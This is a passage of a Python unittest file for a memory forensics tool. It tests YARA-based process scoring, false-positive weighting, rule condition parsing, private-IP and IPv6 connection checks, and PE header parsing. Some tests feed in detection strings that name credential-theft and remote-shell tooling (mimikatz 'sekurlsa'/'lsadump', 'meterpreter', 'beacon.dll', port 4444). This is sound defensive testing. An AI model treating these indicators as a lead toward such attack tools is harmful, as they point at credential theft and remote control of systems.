        source = inspect.getsource(MemoryForensicsGUI.create_realtime_tab)
        self.assertIn("self.yara_loader", source)
        self.assertIn("_init_yara_loader", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_process_display_blends_yara_scores(self, mock_ttk, mock_tk):
        """_update_process_display should blend YARA name-only scores."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._update_process_display)
        self.assertIn("yara_loader", source)
        self.assertIn("yara_score", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_ensemble_weights_sum_to_0_90(self, mock_ttk, mock_tk):
        """Layer weights should sum to 0.90 (0.10 reserved for corroboration)."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        self.assertIn("0.35", source)   # Layer 1 weight
        self.assertIn("0.30", source)   # Layer 2 weight
        self.assertIn("0.25", source)   # Layer 3 weight


class TestYARAFalsePositiveReduction(unittest.TestCase):
    """Tests for false positive reduction in YARA scoring and display."""

    @classmethod
    def setUpClass(cls):
        rules_dir = os.path.join(_script_dir, 'yara_rules')
        if os.path.isdir(rules_dir):
            cls.loader = ExternalYARALoader(rules_dir)
            cls.has_rules = True
        else:
            cls.loader = None
            cls.has_rules = False

    def test_quality_weighting_reduces_single_match(self):
        """Single pattern match from multi-pattern rule should score ~25% of base."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._score_yara_matches)
        self.assertIn("total_strings", source)
        self.assertIn("0.25", source)

    def test_quality_weighting_preserves_multi_match(self):
        """Multi-pattern matches should get full score (no reduction)."""
        # A match with match_count=3, total_strings=5 should NOT be reduced
        fake_matches = [{'severity': 'critical', 'match_count': 3, 'total_strings': 5}]
        # Directly test the scoring logic
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in fake_matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertEqual(total, 40, "Multi-match critical should score full 40")

    def test_quality_weighting_reduces_single_from_multi(self):
        """Single match from 10-pattern rule should be heavily reduced."""
        fake_matches = [{'severity': 'critical', 'match_count': 1, 'total_strings': 10}]
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in fake_matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertEqual(total, 10, "Single match from 10-pattern critical rule should score 10")

    def test_display_threshold_prevents_low_scores(self):
        """_update_process_display should only blend YARA score >= 20."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._update_process_display)
        self.assertIn("yara_score >= 20", source)

    def test_minimum_pattern_length_in_index(self):
        """_build_pattern_index should skip patterns shorter than 4 chars."""
        import inspect
        source = inspect.getsource(ExternalYARALoader._build_pattern_index)
        self.assertIn("len(text_value) < 4", source)

    def test_lsass_low_yara_score(self):
        """lsass.exe should have low quality-weighted YARA score."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("lsass.exe")
        # Score with quality weighting
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertLess(total, 15, f"lsass.exe should score < 15 after quality weighting, got {total}")

    def test_system_low_yara_score(self):
        """System process name should have low quality-weighted YARA score."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("system")
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertLess(total, 15, f"'system' should score < 15 after quality weighting, got {total}")

    def test_searchindexer_low_yara_score(self):
        """SearchIndexer.exe should not produce high YARA scores."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("searchindexer.exe")
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        self.assertLess(total, 15, f"SearchIndexer.exe should score < 15, got {total}")

    def test_real_threat_still_scores_high(self):
        """Real malware patterns should still produce high scores."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        # Multiple mimikatz indicators = real threat
        matches = self.loader.match_text("mimikatz sekurlsa gentilkiwi kerberos lsadump wdigest")
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        total = 0
        for match in matches:
            sev = match.get('severity', 'medium').lower()
            base_score = severity_scores.get(sev, 10)
            matched_count = match.get('match_count', 1)
            total_strings = match.get('total_strings', matched_count)
            if total_strings > 2 and matched_count == 1:
                base_score = int(base_score * 0.25)
            total += base_score
        score = min(100, total)
        self.assertGreater(score, 30, f"Real mimikatz threat should score > 30, got {score}")

    def test_total_strings_in_match_result(self):
        """Match results should include total_strings field."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("mimikatz sekurlsa gentilkiwi kerberos")
        if matches:
            self.assertIn('total_strings', matches[0])
            self.assertGreater(matches[0]['total_strings'], 0)

    def test_match_count_in_match_result(self):
        """Match results should include match_count field."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("mimikatz sekurlsa gentilkiwi kerberos")
        if matches:
            self.assertIn('match_count', matches[0])
            self.assertGreater(matches[0]['match_count'], 0)

    def test_short_patterns_excluded_from_index(self):
        """Pattern index should not contain patterns shorter than 4 chars."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        for pattern in self.loader.pattern_index.keys():
            self.assertGreaterEqual(len(pattern), 4,
                f"Pattern '{pattern}' too short (< 4 chars) in index")

    def test_common_processes_below_display_threshold(self):
        """Common Windows process names should all score below display threshold (15)."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        common_procs = [
            'svchost.exe', 'explorer.exe', 'csrss.exe', 'winlogon.exe',
            'services.exe', 'dwm.exe', 'taskmgr.exe', 'cmd.exe',
            'powershell.exe', 'conhost.exe', 'RuntimeBroker.exe',
            'chrome.exe', 'firefox.exe', 'notepad.exe', 'calc.exe',
        ]
        severity_scores = {'critical': 40, 'high': 25, 'medium': 15, 'low': 5}
        for proc_name in common_procs:
            matches = self.loader.match_text(proc_name)
            total = 0
            for match in matches:
                sev = match.get('severity', 'medium').lower()
                base_score = severity_scores.get(sev, 10)
                matched_count = match.get('match_count', 1)
                total_strings = match.get('total_strings', matched_count)
                if total_strings > 2 and matched_count == 1:
                    base_score = int(base_score * 0.25)
                total += base_score
            self.assertLess(total, 20,
                f"{proc_name} scored {total} (expected < 20 for display threshold)")


class TestYARAEdgeCases(unittest.TestCase):
    """Stress tests for YARA edge cases and boundary conditions."""

    @classmethod
    def setUpClass(cls):
        rules_dir = os.path.join(_script_dir, 'yara_rules')
        if os.path.isdir(rules_dir):
            cls.loader = ExternalYARALoader(rules_dir)
            cls.has_rules = True
        else:
            cls.loader = None
            cls.has_rules = False

    def test_very_long_text_no_crash(self):
        """Matching very long text should not crash."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        long_text = "a" * 100000
        matches = self.loader.match_text(long_text)
        self.assertIsInstance(matches, list)

    def test_special_chars_no_crash(self):
        """Text with special characters should not crash."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        special = "test\x00\x01\x02\xff\\n\\t\"'<>&;|$(){}[]!@#%^*"
        matches = self.loader.match_text(special)
        self.assertIsInstance(matches, list)

    def test_unicode_text_no_crash(self):
        """Unicode text should not crash matching."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        uni_text = "test\u00e9\u00e8\u00ea \u4e2d\u6587 \u0410\u0411\u0412"
        matches = self.loader.match_text(uni_text)
        self.assertIsInstance(matches, list)

    def test_concurrent_match_calls(self):
        """Multiple rapid match_text calls should not corrupt state."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        import threading
        results = []
        def worker(text, idx):
            m = self.loader.match_text(text)
            results.append((idx, len(m)))
        threads = []
        texts = ["mimikatz", "beacon.dll", "chrome.exe", "svchost.exe", "meterpreter"]
        for i, t in enumerate(texts):
            th = threading.Thread(target=worker, args=(t, i))
            threads.append(th)
            th.start()
        for th in threads:
            th.join(timeout=5)
        self.assertEqual(len(results), 5, "All threads should complete")

    def test_condition_with_all_binary_clauses_stripped(self):
        """Rule with only binary conditions (all stripped) should fallback correctly."""
        # Create a minimal loader to test condition evaluation
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        # Test _evaluate_condition with empty condition (all stripped)
        result = loader._evaluate_condition('', {'a'}, {'a': ('test', False)})
        self.assertTrue(result, "Empty condition should match if any var matched")

    def test_condition_n_of_them(self):
        """N of them condition should require N matches."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        # 3 of them with only 2 matched
        result = loader._evaluate_condition('3 of them', {'a', 'b'}, {'a': ('t1', False), 'b': ('t2', False), 'c': ('t3', False)})
        self.assertFalse(result, "3 of them should fail with only 2 matched")
        # 2 of them with 2 matched
        result = loader._evaluate_condition('2 of them', {'a', 'b'}, {'a': ('t1', False), 'b': ('t2', False), 'c': ('t3', False)})
        self.assertTrue(result, "2 of them should pass with 2 matched")

    def test_condition_all_of_them(self):
        """all of them condition should require all matches."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'a': ('t1', False), 'b': ('t2', False)}
        self.assertFalse(loader._evaluate_condition('all of them', {'a'}, all_vars))
        self.assertTrue(loader._evaluate_condition('all of them', {'a', 'b'}, all_vars))

    def test_condition_prefix_wildcard(self):
        """any of ($prefix*) should match variables starting with prefix."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'cmd1': ('t1', False), 'cmd2': ('t2', False), 'net1': ('t3', False)}
        result = loader._evaluate_condition('any of ($cmd*)', {'cmd1'}, all_vars)
        self.assertTrue(result)
        result = loader._evaluate_condition('any of ($net*)', {'cmd1'}, all_vars)
        self.assertFalse(result)

    def test_condition_compound_and_or(self):
        """Compound and/or conditions should evaluate correctly."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'a': ('t1', False), 'b': ('t2', False), 'c': ('t3', False)}
        # $a and $b — both matched
        result = loader._eval_compound('$a and $b', {'a', 'b'}, all_vars)
        self.assertTrue(result)
        # $a and $c — only a matched
        result = loader._eval_compound('$a and $c', {'a', 'b'}, all_vars)
        self.assertFalse(result)
        # $a or $c — a matched
        result = loader._eval_compound('$a or $c', {'a'}, all_vars)
        self.assertTrue(result)

    def test_condition_not_variable(self):
        """not $var should negate variable presence."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        all_vars = {'a': ('t1', False), 'b': ('t2', False)}
        result = loader._eval_compound('not $a', {'a'}, all_vars)
        self.assertFalse(result)
        result = loader._eval_compound('not $a', {'b'}, all_vars)
        self.assertTrue(result)

    def test_escaped_quotes_pattern_extraction(self):
        """Patterns with escaped quotes should be correctly extracted."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $a = "input[type=\\"password\\"]" nocase\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('a', result)
        text_val, is_nocase = result['a']
        self.assertEqual(text_val, 'input[type="password"]')
        self.assertTrue(is_nocase)

    def test_regex_patterns_skipped(self):
        """Regex patterns ($var = /regex/) should be skipped."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $a = /[a-z]+\\.exe/\n    $b = "normal text"\n'
        result = loader._extract_text_strings(strings_section)
        self.assertNotIn('a', result, "Regex pattern should be skipped")
        self.assertIn('b', result, "Normal text should be extracted")

    def test_hex_patterns_skipped(self):
        """Hex patterns ($var = { AB CD }) should be skipped."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $hex = { 4D 5A 90 00 }\n    $text = "normal"\n'
        result = loader._extract_text_strings(strings_section)
        self.assertNotIn('hex', result, "Hex pattern should be skipped")
        self.assertIn('text', result)

    def test_split_top_level_respects_parens(self):
        """_split_top_level should not split inside parentheses."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        loader.rules_by_name = {}
        loader.pattern_index = {}
        result = loader._split_top_level("(a or b) and (c or d)", " and ")
        self.assertEqual(len(result), 2)
        self.assertEqual(result[0].strip(), "(a or b)")
        self.assertEqual(result[1].strip(), "(c or d)")


class TestBug17BraceTextPatterns(unittest.TestCase):
    """Tests for BUG 17: hex skip was discarding text strings containing braces."""

    def test_text_with_braces_extracted(self):
        """Text patterns containing braces (e.g., '{GUID}') should NOT be skipped."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $guid = "{GUID}" ascii\n    $normal = "test" ascii\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('guid', result, "Pattern with braces should be extracted")
        self.assertEqual(result['guid'][0], '{GUID}')
        self.assertIn('normal', result)

    def test_hex_pattern_still_skipped(self):
        """Hex patterns ($var = { AB CD }) should still be skipped."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $hex = { 4D 5A 90 00 }\n    $text = "normal"\n'
        result = loader._extract_text_strings(strings_section)
        self.assertNotIn('hex', result, "Hex pattern should still be skipped")
        self.assertIn('text', result)

    def test_json_brace_pattern_extracted(self):
        """JSON-like patterns with braces should be correctly extracted."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $json = "{\\"ver\\":" ascii\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('json', result, "JSON pattern with braces should be extracted")
        text_val, _ = result['json']
        self.assertIn('{', text_val)


class TestBug18BackslashUnescape(unittest.TestCase):
    """Tests for BUG 18: double-backslash not unescaped in YARA patterns."""

    def test_double_backslash_unescaped(self):
        """YARA '\\\\' (escaped backslash) should be unescaped to single backslash."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $path = "C:\\\\Windows\\\\System32" ascii\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('path', result)
        text_val, _ = result['path']
        self.assertEqual(text_val, 'C:\\Windows\\System32',
            f"Expected 'C:\\Windows\\System32', got '{text_val}'")

    def test_mixed_escapes(self):
        """Both backslash and quote escapes should work together."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $a = "C:\\\\test\\\\\\"quoted\\\\\\"" ascii\n'
        result = loader._extract_text_strings(strings_section)
        self.assertIn('a', result)
        text_val, _ = result['a']
        # C:\\test\\"quoted\\" -> C:\test\"quoted\"
        self.assertIn('C:\\test', text_val)

    def test_path_matching_after_unescape(self):
        """Unescaped path patterns should match process text with single backslashes."""
        loader = ExternalYARALoader.__new__(ExternalYARALoader)
        strings_section = '    $path = "C:\\\\Windows\\\\Temp" nocase\n'
        result = loader._extract_text_strings(strings_section)
        text_val, is_nocase = result['path']
        # After unescape, should be C:\Windows\Temp
        self.assertEqual(text_val, 'C:\\Windows\\Temp')
        # Should match in text with single backslashes
        test_text = 'C:\\Windows\\Temp\\malware.exe'
        if is_nocase:
            self.assertIn(text_val.lower(), test_text.lower())
        else:
            self.assertIn(text_val, test_text)


class TestBug19PrivateIPRange(unittest.TestCase):
    """Tests for BUG 19: 172.x private IP range check was incomplete."""

    @classmethod
    def setUpClass(cls):
        cls.engine = MemoryForensicsEngine()

    def test_172_16_is_private(self):
        """172.16.x.x should be private."""
        self.assertTrue(self.engine._is_private_ip('172.16.0.1'))
        self.assertTrue(self.engine._is_private_ip('172.16.254.254'))

    def test_172_17_to_31_is_private(self):
        """172.17.x.x through 172.31.x.x should all be private."""
        for octet in [17, 20, 24, 28, 31]:
            ip = f'172.{octet}.0.1'
            self.assertTrue(self.engine._is_private_ip(ip),
                f"172.{octet}.0.1 should be private")

    def test_172_32_is_not_private(self):
        """172.32.x.x and above should NOT be private."""
        self.assertFalse(self.engine._is_private_ip('172.32.0.1'))
        self.assertFalse(self.engine._is_private_ip('172.100.0.1'))

    def test_172_15_is_not_private(self):
        """172.15.x.x should NOT be private."""
        self.assertFalse(self.engine._is_private_ip('172.15.0.1'))

    def test_10_range_is_private(self):
        """10.x.x.x should be private."""
        self.assertTrue(self.engine._is_private_ip('10.0.0.1'))
        self.assertTrue(self.engine._is_private_ip('10.255.255.255'))

    def test_192_168_is_private(self):
        """192.168.x.x should be private."""
        self.assertTrue(self.engine._is_private_ip('192.168.1.100'))

    def test_127_is_private(self):
        """127.x.x.x (loopback) should be private."""
        self.assertTrue(self.engine._is_private_ip('127.0.0.1'))

    def test_public_ip_is_not_private(self):
        """Public IPs should not be private."""
        self.assertFalse(self.engine._is_private_ip('8.8.8.8'))
        self.assertFalse(self.engine._is_private_ip('185.220.101.42'))

    def test_timeline_uses_private_ip_check(self):
        """Timeline should use _is_private_ip for IP suspicion logic."""
        import inspect
        source = inspect.getsource(MemoryForensicsEngine.build_timeline)
        self.assertIn('_is_private_ip', source)

    def test_malformed_ip_no_crash(self):
        """Malformed IPs should not crash _is_private_ip."""
        self.assertFalse(self.engine._is_private_ip('172.'))
        self.assertFalse(self.engine._is_private_ip('not.an.ip'))
        self.assertFalse(self.engine._is_private_ip(''))


class TestBug20LambdaClosure(unittest.TestCase):
    """Tests for BUG 20: lambda closure race condition in monitor loop."""

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_lambda_captures_by_value(self, mock_ttk, mock_tk):
        """Monitor loop lambdas should capture variables by value (default args)."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._realtime_monitor_loop)
        # Should use default argument capture, not bare closure
        self.assertIn('lambda cp=current_processes', source)
        self.assertIn('lambda cc=current_connections', source)


class TestDefensiveInit(unittest.TestCase):
    """Tests for defensive initialization of monitoring counters."""

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_counters_initialized_in_create_realtime_tab(self, mock_ttk, mock_tk):
        """new_process_count and suspicious_count should be initialized in create_realtime_tab."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.create_realtime_tab)
        self.assertIn('self.new_process_count', source)
        self.assertIn('self.suspicious_count', source)
        self.assertIn('self.realtime_start_time', source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_process_metrics_initialized_in_create_realtime_tab(self, mock_ttk, mock_tk):
        """_process_metrics and _prev_cpu_times should be initialized in create_realtime_tab."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.create_realtime_tab)
        self.assertIn('self._process_metrics', source)
        self.assertIn('self._prev_cpu_times', source)


class TestProcessMetricsCollection(unittest.TestCase):
    """Tests for CPU and memory metrics collection in the real-time monitor."""

    def test_get_current_processes_returns_set(self):
        """_get_current_processes should return a set of (pid, name) tuples."""
        from memory_forensics_tool import MemoryForensicsGUI
        gui = MemoryForensicsGUI.__new__(MemoryForensicsGUI)
        gui._process_metrics = {}
        gui._prev_cpu_times = {}
        gui.realtime_interval = 3
        result = gui._get_current_processes()
        self.assertIsInstance(result, set)
        # Should have at least some processes on any running system
        self.assertGreater(len(result), 0)

    def test_process_metrics_populated(self):
        """_process_metrics should be populated with (cpu, mem) tuples after collection."""
        from memory_forensics_tool import MemoryForensicsGUI
        gui = MemoryForensicsGUI.__new__(MemoryForensicsGUI)
        gui._process_metrics = {}
        gui._prev_cpu_times = {}
        gui.realtime_interval = 3
        processes = gui._get_current_processes()
        # Metrics should be populated for collected processes
        self.assertGreater(len(gui._process_metrics), 0)
        # Each metric entry should be (cpu_pct, mem_mb)
        for pid, (cpu_pct, mem_mb) in gui._process_metrics.items():
            self.assertIsInstance(cpu_pct, float)
            self.assertIsInstance(mem_mb, float)
            self.assertGreaterEqual(cpu_pct, 0.0)
            self.assertGreaterEqual(mem_mb, 0.0)

    def test_prev_cpu_times_stored(self):
        """_prev_cpu_times should be a dict after collection (may be empty if /V falls back)."""
        from memory_forensics_tool import MemoryForensicsGUI
        gui = MemoryForensicsGUI.__new__(MemoryForensicsGUI)
        gui._process_metrics = {}
        gui._prev_cpu_times = {}
        gui.realtime_interval = 3
        gui._get_current_processes()
        # Should be a dict (populated if /V succeeds, empty if fallback was used)
        self.assertIsInstance(gui._prev_cpu_times, dict)

    def test_cpu_delta_computation(self):
        """CPU% should be computed from delta between cycles."""
        from memory_forensics_tool import MemoryForensicsGUI
        gui = MemoryForensicsGUI.__new__(MemoryForensicsGUI)
        gui._process_metrics = {}
        gui._prev_cpu_times = {}
        gui.realtime_interval = 3
        # First call — baseline (all CPU% should be 0.0)
        gui._get_current_processes()
        for pid, (cpu_pct, mem_mb) in gui._process_metrics.items():
            self.assertEqual(cpu_pct, 0.0, "First cycle should have 0.0 CPU%")
        # Second call — now deltas can be computed
        gui._get_current_processes()
        # Just verify it runs without error; actual delta depends on system load

    def test_update_process_display_uses_metrics(self):
        """_update_process_display should use _process_metrics for CPU/Memory columns."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._update_process_display)
        self.assertIn('_process_metrics', source)
        self.assertNotIn("'--', '--'", source, "Should not hardcode '--' for both CPU and Memory")


# ═══════════════════════════════════════════════════════════════
#  SESSION 9: Bug 22-25 regression tests
# ═══════════════════════════════════════════════════════════════

class TestBug22ConnectionPrivateIP(unittest.TestCase):
    """Bug 22: _check_suspicious_connection used startswith('172.') for all 172.x IPs."""

    def _make_gui(self):
        from memory_forensics_tool import MemoryForensicsGUI, MemoryForensicsEngine
        gui = MemoryForensicsGUI.__new__(MemoryForensicsGUI)
        gui.engine = MemoryForensicsEngine()
        return gui

    def test_172_16_private_no_external_score(self):
        """172.16.x.x should be treated as private (no +10)."""
        gui = self._make_gui()
        _, _, score = gui._check_suspicious_connection('172.16.1.1:80', 'TCP')
        self.assertEqual(score, 0, "172.16.x.x is private, should not add external score")

    def test_172_31_private_no_external_score(self):
        """172.31.x.x should be treated as private (no +10)."""
        gui = self._make_gui()
        _, _, score = gui._check_suspicious_connection('172.31.255.1:80', 'TCP')
        self.assertEqual(score, 0, "172.31.x.x is private, should not add external score")

    def test_172_32_public_gets_external_score(self):
        """172.32.x.x is public, should get +10 external scrutiny."""
        gui = self._make_gui()
        _, _, score = gui._check_suspicious_connection('172.32.1.1:80', 'TCP')
        self.assertGreaterEqual(score, 10, "172.32.x.x is public, should add external score")

    def test_172_0_public_gets_external_score(self):
        """172.0.x.x is public, should get +10 external scrutiny."""
        gui = self._make_gui()
        _, _, score = gui._check_suspicious_connection('172.0.1.1:80', 'TCP')
        self.assertGreaterEqual(score, 10, "172.0.x.x is public, should add external score")

    def test_10_x_private(self):
        """10.x.x.x should be treated as private."""
        gui = self._make_gui()
        _, _, score = gui._check_suspicious_connection('10.0.0.1:80', 'TCP')
        self.assertEqual(score, 0)

    def test_192_168_private(self):
        """192.168.x.x should be treated as private."""
        gui = self._make_gui()
        _, _, score = gui._check_suspicious_connection('192.168.1.1:80', 'TCP')
        self.assertEqual(score, 0)

    def test_uses_engine_is_private_ip(self):
        """_check_suspicious_connection should use engine._is_private_ip for consistency."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._check_suspicious_connection)
        self.assertIn('_is_private_ip', source, "Should use _is_private_ip() method")
        self.assertNotIn("startswith('172.')", source, "Should NOT use startswith('172.')")


class TestBug23PESectionOffset(unittest.TestCase):
    """Bug 23: PE section offset was hardcoded instead of using SizeOfOptionalHeader."""

    def test_uses_size_of_opt_header(self):
        """PE analyzer should read SizeOfOptionalHeader from COFF header."""
        import inspect
        from memory_forensics_tool import AdvancedPEAnalyzer
        source = inspect.getsource(AdvancedPEAnalyzer.analyze)
        self.assertIn('size_of_opt_header', source, "Should read SizeOfOptionalHeader")
        self.assertNotIn('112 if is_64bit else 96', source, "Should NOT hardcode optional header size")

    def test_standard_pe32_section_offset(self):
        """Standard PE32 with SizeOfOptionalHeader=224 should find sections at correct offset."""
        from memory_forensics_tool import AdvancedPEAnalyzer
        # Build a minimal PE32 binary with known section
        pe = bytearray(512)
        # DOS header
        pe[0:2] = b'MZ'
        struct.pack_into('<I', pe, 0x3C, 0x80)  # e_lfanew = 0x80
        # PE signature
        pe[0x80:0x84] = b'PE\x00\x00'
        # COFF header at 0x84
        struct.pack_into('<H', pe, 0x84, 0x14C)   # Machine = i386
        struct.pack_into('<H', pe, 0x86, 1)        # NumberOfSections = 1
        struct.pack_into('<I', pe, 0x88, 0x12345678)  # Timestamp
        struct.pack_into('<H', pe, 0x94, 224)      # SizeOfOptionalHeader = 224 (standard PE32)
        struct.pack_into('<H', pe, 0x96, 0x0102)   # Characteristics
        # Optional header at 0x98
        struct.pack_into('<H', pe, 0x98, 0x10B)    # Magic = PE32
        struct.pack_into('<I', pe, 0xA8, 0x1000)   # Entry point at opt+16
        # Section table starts at 0x98 + 224 = 0x178
        sec_offset = 0x98 + 224
        pe[sec_offset:sec_offset+8] = b'.text\x00\x00\x00'
        struct.pack_into('<I', pe, sec_offset+8, 0x2000)   # VirtualSize
        struct.pack_into('<I', pe, sec_offset+12, 0x1000)  # VirtualAddress
        struct.pack_into('<I', pe, sec_offset+16, 0x200)   # SizeOfRawData
        struct.pack_into('<I', pe, sec_offset+36, 0x60000020)  # Characteristics (CODE|EXECUTE|READ)

        analyzer = AdvancedPEAnalyzer()
        result = analyzer.analyze(bytes(pe))
        # Should find the .text section
        self.assertGreater(len(result['sections']), 0, "Should find at least one section")
        self.assertEqual(result['sections'][0]['name'], '.text')

    def test_pe32plus_section_offset(self):
        """Standard PE32+ with SizeOfOptionalHeader=240 should find sections correctly."""
        from memory_forensics_tool import AdvancedPEAnalyzer
        pe = bytearray(512)
        pe[0:2] = b'MZ'
        struct.pack_into('<I', pe, 0x3C, 0x80)
        pe[0x80:0x84] = b'PE\x00\x00'
        struct.pack_into('<H', pe, 0x84, 0x8664)   # Machine = AMD64
        struct.pack_into('<H', pe, 0x86, 1)        # 1 section
        struct.pack_into('<I', pe, 0x88, 0x12345678)
        struct.pack_into('<H', pe, 0x94, 240)      # SizeOfOptionalHeader = 240 (PE32+)
        struct.pack_into('<H', pe, 0x96, 0x0022)
        struct.pack_into('<H', pe, 0x98, 0x20B)    # Magic = PE32+
        struct.pack_into('<I', pe, 0xA8, 0x1000)   # Entry point
        sec_offset = 0x98 + 240  # 0x188
        pe[sec_offset:sec_offset+8] = b'.code\x00\x00\x00'
        struct.pack_into('<I', pe, sec_offset+8, 0x3000)
        struct.pack_into('<I', pe, sec_offset+12, 0x1000)
        struct.pack_into('<I', pe, sec_offset+16, 0x400)
        struct.pack_into('<I', pe, sec_offset+36, 0xE0000020)

        analyzer = AdvancedPEAnalyzer()
        result = analyzer.analyze(bytes(pe))
        self.assertGreater(len(result['sections']), 0)
        self.assertEqual(result['sections'][0]['name'], '.code')


class TestBug24IPv6Connection(unittest.TestCase):
    """Bug 24: IPv6 brackets not stripped, loopback treated as external."""

    def _make_gui(self):
        from memory_forensics_tool import MemoryForensicsGUI, MemoryForensicsEngine
        gui = MemoryForensicsGUI.__new__(MemoryForensicsGUI)
        gui.engine = MemoryForensicsEngine()
        return gui

    def test_ipv6_loopback_not_suspicious(self):
        """[::1]:port should be recognized as loopback, not external."""
        gui = self._make_gui()
        is_susp, reason, score = gui._check_suspicious_connection('[::1]:8080', 'TCP')
        self.assertEqual(score, 0, "IPv6 loopback should not be suspicious")

    def test_ipv6_bracket_stripped(self):
        """IPv6 addresses in bracket notation should be parsed correctly."""
        gui = self._make_gui()
        # This should not crash
        gui._check_suspicious_connection('[2001:db8::1]:443', 'TCP')

    def test_ipv6_link_local_not_suspicious(self):
        """fe80:: link-local should be recognized as local."""
        gui = self._make_gui()
        _, _, score = gui._check_suspicious_connection('[fe80::1]:80', 'TCP')
        self.assertEqual(score, 0, "IPv6 link-local should not be suspicious")

    def test_ipv4_still_works(self):
        """IPv4 addresses should still parse correctly after IPv6 fix."""
        gui = self._make_gui()
        _, _, score = gui._check_suspicious_connection('10.0.0.1:80', 'TCP')
        self.assertEqual(score, 0, "IPv4 private should still work")

    def test_malicious_port_still_detected_ipv6(self):
        """Malicious ports on IPv6 should still be detected."""
        gui = self._make_gui()
        _, _, score = gui._check_suspicious_connection('[8.8.8.8]:4444', 'TCP')
